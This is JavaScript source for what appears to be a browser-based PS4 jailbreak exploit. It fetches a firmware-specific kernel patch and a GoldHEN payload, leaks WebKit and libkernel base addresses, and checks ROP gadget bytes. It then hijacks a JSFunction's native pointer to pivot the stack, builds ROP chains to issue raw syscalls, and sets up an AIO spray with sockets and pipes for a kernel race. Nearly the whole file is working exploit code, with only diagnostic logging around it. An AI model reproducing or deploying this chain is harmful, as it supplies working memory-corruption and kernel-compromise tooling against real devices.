const AR2_QENTRY = 0x50, AIO_ENTRY_SIZE = 0x80;

const SYS = {
    read: 3, write: 4, open: 5, close: 6, getpid: 20, accept: 30, socket: 97,
    setuid: 23, getuid: 24, geteuid: 25,
    connect: 98, bind: 104,
    setsockopt: 105, listen: 106, getsockopt: 118, socketpair: 135,
    nanosleep: 240, sched_yield: 331, thr_self: 432, rtprio_thread: 466,
    fcntl: 92, ioctl: 54,
    thr_suspend_ucontext: 632, thr_resume_ucontext: 633,
    evf_create: 538, evf_delete: 539, evf_set: 544, evf_clear: 545,
    cpuset_getaffinity: 487, cpuset_setaffinity: 488,
    aio_multi_delete: 662, aio_multi_wait: 663, aio_multi_poll: 664,
    aio_multi_cancel: 666, aio_submit_cmd: 669
};

const keepAlive = [];
let execAddr = null, origNative = null, mFunctionPatched = false;
let mainPivotAddr = null, mainSavedCell = null, cellCorrupted = false;
let workerArmed = false, workerWired = false, rpc = null;
let wMasterAddr = null, origWorkerVector = null;
let savedMask = null, maskChanged = false;
let savedPrio = null, prioChanged = false;
let restoreCtx = null;

let committed = false, rebootRequired = false;
let pipeM = null, pipeS = null;

let kFdtOfiles = null, pipeMFp = null, pipeSFp = null;

let kLeakFp = null;
let kv = null;

let repaired = false, cleanupDone = false;

let jailbroken = false, kpatched = false, payloadRunning = false;
let pipeFdsHeld = null;

let kvProbe = null;

let committed2 = false;
const pktoptsTwins = [];
const ipv6Socks = [];
const twinSocks = [];
const openFds = [];
const liveAioIds = [];

function makeRpc(worker) {
    let seq = 0;
    const pending = new Map();
    worker.onmessage = function (e) {
        const d = e.data || {};
        const slot = pending.get(d.id);
        if (!slot) return;
        pending.delete(d.id);
        clearTimeout(slot.timer);
        if (d.type === "err") slot.reject(new Error(String(d.value)));
        else slot.resolve(d.value);
    };
    worker.onerror = function (e) {
        mark("WORKER-ONERROR", (e && e.message) ? e.message : String(e));
    };
    return function call(name) {
        const args = Array.prototype.slice.call(arguments, 1);
        return new Promise(function (resolve, reject) {
            const id = seq++;
            const timer = setTimeout(function () {
                pending.delete(id);
                reject(new Error("timeout waiting for " + name));
            }, 15000);
            pending.set(id, { resolve: resolve, reject: reject, timer: timer });
            worker.postMessage({ id: id, name: name, args: args });
        });
    };
}

(async function () {
    let worker = null;
    let p = null, sc = null, stubOf = null;
    try {
        const params = new URLSearchParams(location.search);

        const fwResolved = offsetsFor(navigator.userAgent);
        const fwKey = fwResolved.key;
        // off.kpatch wins when a firmware shares another's kernel and therefore
        // its blob -- 12.02 uses 1200.bin. Otherwise derive it from the key.
        const kpatchName = fwResolved.off && fwResolved.off.kpatch
            ? "patches/" + fwResolved.off.kpatch
            : fwKey ? "patches/" + fwKey.replace(".", "") + ".bin" : null;
        let kpatch = null;
        try {
            if (kpatchName) {
                const rsp = await fetch(kpatchName);
                if (rsp.ok) kpatch = new Uint8Array(await rsp.arrayBuffer());
            }
        } catch (e) {
            mark("KPATCH-FETCH-FAILED", (e && e.message) ? e.message : String(e));
        }

        const KPATCH_JMP_SITES = [];
        if (kpatch) {
            for (let i = 0; i + 7 <= kpatch.length; ++i) {
                if (kpatch[i] !== 0xc6 || kpatch[i + 1] !== 0x81) continue;
                if (kpatch[i + 6] !== 0xeb) continue;
                KPATCH_JMP_SITES.push(((kpatch[i + 2]) | (kpatch[i + 3] << 8)
                    | (kpatch[i + 4] << 16) | (kpatch[i + 5] << 24)) >>> 0);
            }
        }
        mark("KPATCH-BLOB", kpatch
            ? kpatch.length + " bytes of " + kpatchName + " in hand, head "
                + hexBytes(kpatch.subarray(0, 12))
                + "   " + KPATCH_JMP_SITES.length + " gateable jump site(s): "
                + KPATCH_JMP_SITES.slice(0, 12)
                    .map(function (v) { return "0x" + v.toString(16); }).join(" ")
            : (kpatchName ? "NOT LOADED (" + kpatchName + ") -- stage 9 will not run"
                          : "no firmware key, so no blob name -- stage 9 will not run"));

        let payload = null;
        try {
            const prsp = await fetch("../goldhen.bin");
            if (prsp.ok) payload = new Uint8Array(await prsp.arrayBuffer());
        } catch (e) {
            mark("PAYLOAD-FETCH-FAILED", (e && e.message) ? e.message : String(e));
        }
        mark("PAYLOAD-BLOB", payload
            ? "bytes=" + payload.length + " head=" + hexBytes(payload.subarray(0, 12))
                + (payload[0] === 0xe9 ? " entry=e9-jmp-rel32"
                                       : " entry=NOT-e9")
            : "NOT LOADED -- stage 10 will not run");

        const ITERS = params.has("iters") ? parseInt(params.get("iters"), 10) : 400;
        const SPRAY_NUM = params.has("spray")
            ? parseInt(params.get("spray"), 10) : 0x200;

        const STOP_PRECOMMIT = params.get("stop") === "precommit";

        const PATCH_SETTLE = params.has("patchsettle")
            ? parseInt(params.get("patchsettle"), 10) : 2000;
        const PAYLOAD_SETTLE = params.has("payloadsettle")
            ? parseInt(params.get("payloadsettle"), 10) : 2000;

        let settleTs = null;
        function settle(ms) {
            if (!(ms > 0) || !settleTs) return;
            settleTs.u8.fill(0);
            settleTs.dv.setUint32(0, Math.floor(ms / 1000), true);
            settleTs.dv.setUint32(8, (ms % 1000) * 1000000, true);
            sc(SYS.nanosleep, settleTs.addr, 0);
        }

        const ua = navigator.userAgent;
        const { key, off } = offsetsFor(ua);
        mark("FW", key || "(not a PS4 UA)");
        if (!off) { state("no offsets for this firmware", "bad"); return; }

        mark("FW-STATUS", key + " -- " + (off.fw_status
            || "no status recorded in the offsets block."));
        mark("DRY-RUN-PLAN", "budget=" + ITERS + " spray=" + SPRAY_NUM
            + (STOP_PRECOMMIT
                ? "  -- ?stop=precommit: the second aio_multi_delete WILL BE "
                  + "WITHHELD. Nothing is freed twice and no reboot is owed."
                : "  -- ARMED: the worker issues a REAL aio_multi_delete"));

        state("running the primitive...", "warn");

        await new Promise(function (r) { setTimeout(r, 0); });
        const carrier = await establishPrimitive({
            maxAttempts: 6,

            onEvent: function (tag, detail, attempt) {
                mark(tag, (attempt != null ? '[' + attempt + '] ' : '')
                    + (detail || ''));
            }
        });
        installWindowP(carrier);
        if (!window.p) throw new Error("window.p was not installed");
        p = window.p;
        mark("PRIMITIVE-OK", "");

        const fnAddr = p.leakval(Math.expm1);
        execAddr = p.read8(fnAddr.add32(0x18));
        const nativeFn = p.read8(execAddr.add32(off.wk_JSFunction_m_function));
        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        const g = function (rva) { return webkitBase.add32(rva); };
        const libkernelBase = p.read8(g(off.wk___imp___error)).sub32(off.k__error);
        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
        if (!plausibleBase(webkitBase) || !plausibleBase(libkernelBase)) {
            state("a base looks wrong", "bad"); return;
        }

        const GADGETS = [
            ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3], false, true],
            ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3], false, true],
            ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3], false, true],
            ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3], false, true],
            ["POP_R8_RET", off.wk_POP_R8_RET, [0x41, 0x58, 0xc3], true, true],
            ["POP_R9_RET", off.wk_POP_R9_RET, [0x41, 0x59, 0xc3], true, false],
            ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3], false, true],
            ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3], false, true],
            ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET,
                [0x48, 0x89, 0x07, 0xc3], false, true],
            ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3], false, true],
            ["G0", off.wk_MOV_RDI_RSI_30_CALL,
                [0x48, 0x8b, 0x7e, 0x30, 0x48, 0x8b, 0x07, 0xff, 0x10], false, true],
            ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18,
                [0x58, 0x48, 0x8b, 0x07, 0xff, 0x60, 0x18], false, true],
            ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10,
                [0x55, 0x48, 0x89, 0xe5, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x10], false, true],
            ["G3", off.wk_MOV_RDI_RAX_8_CALL_20,
                [0x48, 0x8b, 0x78, 0x08, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x20], false, true],

            ["G4", off.wk_MOV_RDX_RAX_18_CALL_10,
                [0x48, 0x8b, 0x50, off.pivot_view_sp,
                 0x48, 0x8b, 0x07, 0xff, 0x50, 0x10], false, true]
        ];
        const G = {};
        let fatal = false, gated = 0;
        for (let i = 0; i < GADGETS.length; ++i) {
            const name = GADGETS[i][0], rva = GADGETS[i][1], want = GADGETS[i][2];
            const rebasable = GADGETS[i][3], required = GADGETS[i][4];
            const rexTolerant = want[0] >= 0x40 && want[0] <= 0x4f;
            function readRun(base) {
                const got = []; let ok = true;
                for (let j = 0; j < want.length; ++j) {
                    const b = p.read1(g(base + j));
                    got.push(b);
                    if (b === want[j]) continue;
                    const rexOk = rexTolerant && j === 0 && (b & 0xf0) === 0x40
                        && (b & 0x09) === (want[j] & 0x09);
                    if (!rexOk) ok = false;
                }
                return { got: got, ok: ok };
            }
            let use = rva, r = readRun(rva);
            if (!r.ok && rebasable) {
                const alt = readRun(rva - 1);
                if (alt.ok) { use = rva - 1; r = alt; mark("GADGET-REBASED", name); }
            }
            if (r.ok) { gated++; G[name] = g(use); }
            else {
                if (required) fatal = true;
                mark("GADGET-BYTES", name + " @0x" + use.toString(16) + " got "
                    + hexBytes(r.got) + " want " + hexBytes(want) + "  MISMATCH");
            }
        }
        check("gadget-table-fits-module", !fatal,
            gated + "/" + GADGETS.length + " gated");
        if (fatal) { state("gadget bytes did not match", "bad"); return; }
        const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                           G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
        check("5-argument-calls-possible-pop-r8", !!argGadget[4], "");
        if (!argGadget[4]) { state("no pop r8", "bad"); return; }

        const SYS9 = { mmap: 0x1dd, jitshm_create: 0x215, kexec: 0x295 };
        const wanted = [];
        for (const k in SYS) wanted.push(SYS[k]);
        for (const k in SYS9) wanted.push(SYS9[k]);
        state("scanning libkernel for syscall stubs...", "warn");
        const tScan = Date.now();
        const stubRva = new Map();

        let seeded = 0, seedBad = 0;
        if (off.k_stubs) {
            for (const numStr in off.k_stubs) {
                const num = +numStr, o = off.k_stubs[numStr];
                const v = p.read8(libkernelBase.add32(o));
                if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) {
                    seedBad++; continue;
                }
                const got = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
                if (got !== num) { seedBad++; continue; }
                stubRva.set(num, o); seeded++;
            }
            mark("STUB-TABLE", "seeded=" + seeded + "/"
                + Object.keys(off.k_stubs).length + " rejected=" + seedBad);
        }
        {
            const need = new Set(wanted.filter(function (n) {
                return !stubRva.has(n);
            }));
            for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
                const v = p.read8(libkernelBase.add32(o));
                if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49)
                    continue;
                const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
                if (need.has(num)) { stubRva.set(num, o); need.delete(num); }
            }
        }
        mark("STUB-SCAN", stubRva.size + "/" + wanted.length + " in "
            + (Date.now() - tScan) + " ms");
        const stubAddr = new Map();
        const missing = [];
        for (const k in SYS) {
            const num = SYS[k];
            if (!stubRva.has(num)) { missing.push(k); continue; }
            const a = libkernelBase.add32(stubRva.get(num));

            const plain = p.read1(a.add32(12)) === 0x72
                       && p.read1(a.add32(13)) === 0x01
                       && p.read1(a.add32(14)) === 0xc3;
            if (!plain) { missing.push(k + "(wrapper)"); continue; }
            stubAddr.set(num, a);
        }
        check("syscall-race-needs-plain-stub",
            missing.length === 0,
            missing.length ? "missing: " + missing.join(",")
                : Object.keys(SYS).length + "/" + Object.keys(SYS).length);
        if (missing.length) { state("missing syscall stubs", "bad"); return; }

        {
            const got9 = [];
            for (const k in SYS9) {
                const num = SYS9[k];
                if (!stubRva.has(num)) { got9.push(k + "=none"); continue; }
                const a = libkernelBase.add32(stubRva.get(num));
                stubAddr.set(num, a);
                const plain = p.read1(a.add32(12)) === 0x72
                           && p.read1(a.add32(13)) === 0x01
                           && p.read1(a.add32(14)) === 0xc3;
                got9.push(k + (plain ? "=stub" : "=wrapper"));
            }
            mark("STAGE9-STUBS", got9.join("  "));
        }

        function bufAddr(ab) {
            const cell = p.leakval(ab);
            const impl = p.read8(cell.add32(off.wk_ArrayBuffer_m_impl));
            return p.read8(impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
        }
        function eq(a, b) { return a.low === b.low && a.hi === b.hi; }

        function makeCtx(tag) {

            const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
            const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE);
            const kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
            const c = {
                tag: tag, storeDv: new DataView(sb), pivotDv: new DataView(pb),
                stackDv: new DataView(kb), frameDv: new DataView(fb),
                stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb)
            };
            keepAlive.push(sb, pb, kb, fb, c.storeDv, c.pivotDv, c.stackDv,
                c.frameDv, c.stackU8, c.frameU8);
            c.S = bufAddr(sb); c.P = bufAddr(pb);
            c.K = bufAddr(kb); c.F = bufAddr(fb);
            const pairs = [[c.storeDv, c.S], [c.pivotDv, c.P],
                           [c.stackDv, c.K], [c.frameDv, c.F]];
            for (let i = 0; i < pairs.length; ++i) {
                const dv = pairs[i][0], ad = pairs[i][1];
                dv.setUint32(0, 0xdeadbeef, true);
                if (p.read4(ad) !== 0xdeadbeef) return null;
                p.write4(ad.add32(8), 0xfeedface);
                if (dv.getUint32(8, true) !== 0xfeedface) return null;
                dv.setUint32(0, 0, true); dv.setUint32(8, 0, true);
            }
            put(c.storeDv, 0x00, G.G1);
            put(c.storeDv, 0x08, c.P);
            put(c.storeDv, 0x10, G.G3);
            put(c.storeDv, 0x18, G.G2);
            put(c.pivotDv, 0x00, c.P);
            put(c.pivotDv, 0x10, G.G5);
            put(c.pivotDv, 0x20, G.G4);
            return c;
        }
        const mainCtx = makeCtx("main"), wrkCtx = makeCtx("worker");
        check("chain-contexts-round-tripped", !!mainCtx && !!wrkCtx, "");
        if (!mainCtx || !wrkCtx) { state("backing stores failed", "bad"); return; }

        function layout(c, insts, targetIdx) {
            c.stackU8.fill(0); c.frameU8.fill(0);
            let at = 0x2000 - 8 * insts.length;
            if (targetIdx >= 0 && (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0)) at -= 8;
            for (let i = 0; i < insts.length; ++i) put(c.stackDv, at + 8 * i, insts[i]);
            put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
        }

        function chain(c) {
            const insts = [];
            let targetIdx = -1;
            const b = {
                store: function (addr, v) {
                    insts.push(G.POP_RAX_RET); insts.push(v);
                    insts.push(G.POP_RDI_RET); insts.push(addr);
                    insts.push(G.MOV_RDI_RAX_RET); return b;
                },
                args: function (list) {
                    for (let i = 0; i < list.length; ++i) {
                        insts.push(argGadget[i]); insts.push(list[i]);
                    }
                    return b;
                },
                call: function (target) {

                    const idx = insts.length;
                    if (targetIdx < 0) targetIdx = idx;
                    else if (((idx - targetIdx) & 1) !== 0)
                        throw new Error("chain: call slots " + targetIdx
                            + " and " + idx + " differ in parity, so one of "
                            + "them would be misaligned");
                    insts.push(target); return b;
                },
                saveRax: function (addr) {
                    insts.push(G.POP_RDI_RET); insts.push(addr);
                    insts.push(G.MOV_RDI_RAX_RET); return b;
                },
                end: function () {
                    insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
                    insts.push(G.LEAVE_RET);
                    return { insts: insts, targetIdx: targetIdx };
                }
            };
            return b;
        }
        function callInsts(c, target, args) {
            const insts = [];
            for (let i = 0; i < args.length; ++i) {
                insts.push(argGadget[i]); insts.push(args[i]);
            }
            const targetIdx = insts.length;
            insts.push(target);
            insts.push(G.POP_RDI_RET); insts.push(c.F);
            insts.push(G.MOV_RDI_RAX_RET);
            insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
            insts.push(G.LEAVE_RET);
            return { insts: insts, targetIdx: targetIdx };
        }

        const mFuncAt = execAddr.add32(off.wk_JSFunction_m_function);
        origNative = p.read8(mFuncAt);
        if (!sameI64(origNative, nativeFn)) {
            state("m_function moved under us", "bad"); return;
        }
        const mainPivotObj = {};
        keepAlive.push(mainPivotObj);
        mainPivotAddr = p.leakval(mainPivotObj);
        mainSavedCell = p.read8(mainPivotAddr);
        p.write8(mFuncAt, G.G0);
        mFunctionPatched = true;

        function fireMain(insts, targetIdx) {
            layout(mainCtx, insts, targetIdx);
            cellCorrupted = true;
            p.write8(mainPivotAddr, mainCtx.S);
            Math.expm1(mainPivotObj);
            p.write8(mainPivotAddr, mainSavedCell);
            cellCorrupted = false;
        }
        sc = function (num) {
            const args = Array.prototype.slice.call(arguments, 1);
            const t = stubAddr.get(num);
            if (!t) throw new Error("no stub for syscall " + num);
            const b = callInsts(mainCtx, t, args);
            fireMain(b.insts, b.targetIdx);
            const lo = mainCtx.frameDv.getUint32(0, true);
            const hi = mainCtx.frameDv.getUint32(4, true);
            return { lo: lo, hi: hi, i32: lo | 0 };
        };

        const rawSyscallAt = stubAddr.get(SYS.getpid).add32(7);
        function scRaw(num) {
            if (!rawSyscallAt) throw new Error("no raw syscall entry");
            const args = Array.prototype.slice.call(arguments, 1);
            const insts = [];
            for (let i = 0; i < args.length; ++i) {
                insts.push(argGadget[i]); insts.push(args[i]);
            }
            insts.push(G.POP_RAX_RET); insts.push(num);
            const targetIdx = insts.length;
            insts.push(rawSyscallAt);
            insts.push(G.POP_RDI_RET); insts.push(mainCtx.F);
            insts.push(G.MOV_RDI_RAX_RET);
            insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
            insts.push(G.LEAVE_RET);
            fireMain(insts, targetIdx);
            const lo = mainCtx.frameDv.getUint32(0, true);
            const hi = mainCtx.frameDv.getUint32(4, true);
            return { lo: lo, hi: hi, i32: lo | 0 };
        }
        function scAny(num) {
            return stubAddr.has(num) ? sc.apply(null, arguments)
                                     : scRaw.apply(null, arguments);
        }

        function callAddr(target) {
            const args = Array.prototype.slice.call(arguments, 1);
            const b = callInsts(mainCtx, target, args);
            fireMain(b.insts, b.targetIdx);
            const lo = mainCtx.frameDv.getUint32(0, true);
            const hi = mainCtx.frameDv.getUint32(4, true);
            return { lo: lo, hi: hi, i32: lo | 0 };
        }

        layout(mainCtx, [G.POP_RDI_RET, mainCtx.F.add32(8), G.MOV_RDI_RAX_RET,
                         G.POP_RAX_RET, JSVALUE_UNDEFINED, G.LEAVE_RET], -1);
        cellCorrupted = true;
        p.write8(mainPivotAddr, mainCtx.S);
        Math.expm1(mainPivotObj);
        p.write8(mainPivotAddr, mainSavedCell);
        cellCorrupted = false;
        const wit = new int64(mainCtx.frameDv.getUint32(8, true),
                              mainCtx.frameDv.getUint32(12, true));
        check("main-thread-pivot-lands", sameI64(wit, mainCtx.P),
            wit + " want " + mainCtx.P);
        if (!sameI64(wit, mainCtx.P)) { state("pivot failed", "bad"); return; }
        const pid = sc(SYS.getpid).i32;
        mark("PID", String(pid));

        function alloc(len) {
            const ab = new ArrayBuffer(len);
            const rec = { ab: ab, dv: new DataView(ab), u8: new Uint8Array(ab),
                          addr: bufAddr(ab), len: len };
            keepAlive.push(ab, rec.dv, rec.u8);
            return rec;
        }
        const reqs1 = alloc(AIO_RW_REQ_SIZE * AIO_MAX_NUM);
        const outs = alloc(AIO_MAX_NUM * 4);
        const aioIds = alloc(NUM_REQS * 4);
        const sprayIds = alloc(SPRAY_NUM * 4);
        const blockIds = alloc(4);
        const servAddr = alloc(16);
        const lingerBuf = alloc(8);
        const optval = alloc(4);
        const info = alloc(TCP_INFO_SIZE);
        const infoLen = alloc(4);
        const maskBuf = alloc(0x10);

        const shared = alloc(0x40);
        const tsBuf = alloc(0x10);
        settleTs = alloc(0x10);
        const prioBuf = alloc(4);

        restoreCtx = { maskBuf: maskBuf, prioBuf: prioBuf };
        mark("BUFFERS", "reqs1=" + reqs1.addr + " outs=" + outs.addr
            + " aio_ids=" + aioIds.addr);

        function buildReqs1(count, fd) {
            reqs1.u8.fill(0);
            for (let i = 0; i < count; ++i) {
                const o = i * AIO_RW_REQ_SIZE;
                reqs1.dv.setUint32(o + AIO_RW_REQ_NBYTE, fd === -1 ? 0 : 1, true);
                reqs1.dv.setInt32(o + AIO_RW_REQ_FD, fd, true);
            }
        }

        prioBuf.dv.setUint16(0, 0xffff, true);
        prioBuf.dv.setUint16(2, 0xffff, true);
        const prioLookup = sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioBuf.addr).i32;
        savedPrio = [prioBuf.dv.getUint16(0, true), prioBuf.dv.getUint16(2, true)];
        maskBuf.u8.fill(0);
        const affLookup = sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
            new int64(0xffffffff, 0xffffffff), 0x10, maskBuf.addr).i32;
        savedMask = new int64(maskBuf.dv.getUint32(0, true),
                              maskBuf.dv.getUint32(4, true));
        check("inherited-thread-attributes-read",
            prioLookup === 0 && affLookup === 0,
            "prio {" + savedPrio + "}  mask " + savedMask
            + "  (cores " + (function () {
                const c = [];
                for (let i = 0; i < 32; ++i)
                    if (savedMask.low & (1 << i)) c.push(i);
                return c.join(",");
            })() + " are available to this process)");

        state("wiring the worker...", "warn");
        worker = new Worker("rpc_worker.js");
        rpc = makeRpc(worker);
        await rpc("ping");
        const markerArr = await rpc("init", SENT_LO, SENT_HI);
        keepAlive.push(markerArr);
        const D = bufAddr(markerArr.buffer);
        if ((p.read4(D) >>> 0) !== SENT_LO) {
            check("transferred-store-worker-memory", false, "D=" + D);
            state("transfer did not preserve the store", "bad"); return;
        }
        function ptrish(v) { return v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0; }
        const storage = p.read8(D.add32(0x10));
        const markerCell = ptrish(storage) ? p.read8(storage.add32(8)) : null;
        if (!markerCell || !ptrish(markerCell)) {
            check("walk-reached-worker-marker", false,
                "storage=" + storage + " cell=" + markerCell);
            state("walk failed -- run step 4b for the dump", "bad"); return;
        }
        const butterfly = p.read8(markerCell.add32(8));
        let wMaster = null, wVictim = null, wLeak = null;
        for (let k = 1; k <= 8; ++k) {
            const val = p.read8(butterfly.sub32(8 * k));
            if (!ptrish(val)) continue;
            const inl = p.read8(val.add32(0x10));
            const len = p.read4(val.add32(0x18)) >>> 0;
            if (inl.hi === 0 && inl.low === 2) { if (!wLeak) wLeak = val; }
            else if (inl.hi > 0 && len === 6) { if (!wMaster) wMaster = val; }
            else if (inl.hi > 0 && len === 0x30) { if (!wVictim) wVictim = val; }
        }
        check("walk-found-worker-victim-master",
            !!(wMaster && wVictim && wLeak), "master=" + wMaster);
        if (!(wMaster && wVictim && wLeak)) { state("walk failed", "bad"); return; }
        wMasterAddr = wMaster;
        origWorkerVector = p.read8(wMaster.add32(0x10));
        p.write8(wMaster.add32(0x10), wVictim);
        workerWired = true;
        await rpc("setup", wLeak.low, wLeak.hi);
        await rpc("armPivot", G.G0.low, G.G0.hi);
        workerArmed = true;
        mark("WORKER-READY", "wired and armed");

        function fireWorkerAsync(num, args) {
            const t = stubAddr.get(num);
            const b = callInsts(wrkCtx, t, args);
            layout(wrkCtx, b.insts, b.targetIdx);
            return rpc("fire", wrkCtx.S.low, wrkCtx.S.hi);
        }
        function workerRet() {
            return { lo: wrkCtx.frameDv.getUint32(0, true),
                     hi: wrkCtx.frameDv.getUint32(4, true),
                     i32: wrkCtx.frameDv.getUint32(0, true) | 0 };
        }
        await fireWorkerAsync(SYS.getpid, []);
        const wpid = workerRet().i32;
        check("worker-calls-kernel-process", wpid === pid,
            "worker pid=" + wpid + " main pid=" + pid);

        check("worker-answers-before-arm",
            (await rpc("ping")) === "pong", "");

        state("setting up the aio batches...", "warn");
        const pairBuf = alloc(8);
        if (sc(SYS.socketpair, 1, SOCK_STREAM, 0, pairBuf.addr).i32 === -1)
            throw new Error("socketpair failed");
        const blockSs = [pairBuf.dv.getInt32(0, true), pairBuf.dv.getInt32(4, true)];
        openFds.push(blockSs[0], blockSs[1]);
        mark("BLOCK-SS", blockSs.join(","));

        buildReqs1(WORKER_NUM, blockSs[0]);
        const tBlock = Date.now();
        sc(SYS.aio_submit_cmd, AIO_CMD_READ, reqs1.addr, WORKER_NUM,
            AIO_PRIORITY_HIGH, blockIds.addr);
        const blockId = blockIds.dv.getUint32(0, true);
        mark("BLOCK-AIO", "id=" + hx(blockId) + "  " + (Date.now() - tBlock) + " ms");
        check("blocking-aio-request-accepted", blockId !== 0, "");
        if (blockId !== 0) liveAioIds.push(blockId);

        buildReqs1(NUM_REQS, -1);
        const tSpray = Date.now();
        for (let i = 0; i < SPRAY_NUM; ++i)
            sc(SYS.aio_submit_cmd, AIO_CMD_READ, reqs1.addr, NUM_REQS,
                AIO_PRIORITY_HIGH, sprayIds.addr.add32(i * 4));
        const sprayMs = Date.now() - tSpray;
        let sprayNonZero = 0;
        for (let i = 0; i < SPRAY_NUM; ++i)
            if (sprayIds.dv.getUint32(i * 4, true) !== 0) sprayNonZero++;
        mark("SPRAY-AIO", SPRAY_NUM + " submits, " + sprayNonZero
            + " ids, " + sprayMs + " ms  ("
            + (sprayMs / SPRAY_NUM).toFixed(2) + " ms per ROP syscall)");
        check("spray-submit-returned-id", sprayNonZero === SPRAY_NUM, "");
        for (let i = 0; i < SPRAY_NUM; ++i) liveAioIds.push(sprayIds.dv.getUint32(i * 4, true));

        for (let off2 = 0; off2 < SPRAY_NUM; off2 += AIO_MAX_NUM) {
            const step = Math.min(AIO_MAX_NUM, SPRAY_NUM - off2);
            sc(SYS.aio_multi_cancel, sprayIds.addr.add32(off2 * 4), step, outs.addr);
        }
        mark("SPRAY-CANCELLED", "");

        state("dry run: everything but the racing delete...", "warn");
        servAddr.dv.setUint8(0, 16);
        servAddr.dv.setUint8(1, AF_INET);
        servAddr.dv.setUint16(2, 0x8d13, true);
        servAddr.dv.setUint32(4, 0x0100007f, true);
        lingerBuf.dv.setInt32(0, 1, true);
        lingerBuf.dv.setInt32(4, 1, true);

        const server = sc(SYS.socket, AF_INET, SOCK_STREAM, 0).i32;
        openFds.push(server);
        optval.dv.setInt32(0, 1, true);
        sc(SYS.setsockopt, server, SOL_SOCKET, SO_REUSEADDR, optval.addr, 4);
        const br = sc(SYS.bind, server, servAddr.addr, 16).i32;

        optval.dv.setInt32(0, PEER_RCVBUF, true);
        sc(SYS.setsockopt, server, SOL_SOCKET, SO_RCVBUF, optval.addr, 4);
        const lr2 = sc(SYS.listen, server, 1).i32;
        check("loopback-server-socket-bound-listening",
            br === 0 && lr2 === 0, "bind=" + br + " listen=" + lr2
            + " fd=" + server);
        if (br !== 0 || lr2 !== 0) { state("could not set up the server", "bad"); }

        const PIPE_SYS = 42, F_SETFL = 4, O_NONBLOCK = 4;
        const FIOSETOWN = 0x8004667c;
        const pipeBuf = alloc(16);
        const masterPipe = [-1, -1], slavePipe = [-1, -1], leakPipe = [-1, -1];
        const fcntlRc = [];
        let pipesOk = false, leakPipeOk = false;
        {
            let pipeAt = null;
            for (let o = 0; o < off.k_scan_stage1; o += 16) {
                const v = p.read8(libkernelBase.add32(o));
                if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49)
                    continue;
                const nn = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
                if (nn === PIPE_SYS) { pipeAt = libkernelBase.add32(o); break; }
            }
            if (pipeAt) {
                stubAddr.set(PIPE_SYS, pipeAt);
                const pairs = [masterPipe, slavePipe];
                let made = 0;
                for (let i = 0; i < pairs.length; ++i) {
                    pipeBuf.u8.fill(0);
                    if (sc(PIPE_SYS, pipeBuf.addr).i32 !== 0) break;
                    pairs[i][0] = pipeBuf.dv.getInt32(0, true);
                    pairs[i][1] = pipeBuf.dv.getInt32(4, true);
                    if (pairs[i][0] <= 2 || pairs[i][1] <= 2) break;
                    openFds.push(pairs[i][0], pairs[i][1]);

                    fcntlRc.push(sc(SYS.fcntl, pairs[i][0], F_SETFL, O_NONBLOCK).i32);
                    fcntlRc.push(sc(SYS.fcntl, pairs[i][1], F_SETFL, O_NONBLOCK).i32);
                    made++;
                }
                pipesOk = made === 2;

                if (pipesOk) {
                    pipeBuf.u8.fill(0);
                    if (sc(PIPE_SYS, pipeBuf.addr).i32 === 0) {
                        leakPipe[0] = pipeBuf.dv.getInt32(0, true);
                        leakPipe[1] = pipeBuf.dv.getInt32(4, true);
                        if (leakPipe[0] > 2 && leakPipe[1] > 2) {
                            openFds.push(leakPipe[0], leakPipe[1]);
                            leakPipeOk = true;
                        }
                    }
                }
            }
            check("two-pipe-pairs-created-set", pipesOk,
                "master " + masterPipe + "   slave " + slavePipe
                + (pipeAt ? "" : "  (no mov rax,42 found)"));
            check("fcntlf_setfl-o_nonblock-succeeded-four-pipe",
                fcntlRc.length === 4 && fcntlRc.every(function (r) { return r === 0; }),
                "returns {" + fcntlRc + "} -- -1 on any of them and the "
                + "reference's KernelView constructor throws");
            check("third-pipe-exists-carry-ar2_file", leakPipeOk,
                leakPipeOk ? "leak " + leakPipe
                    : "without it, curproc falls back to the aio_info read that "
                    + "the 00:38 run found reclaimed");
        }

        const preTs = alloc(0x10);
        const wideBuf = alloc(0x8000);
        wideBuf.u8.fill(0x41);
        const optLen = alloc(4);
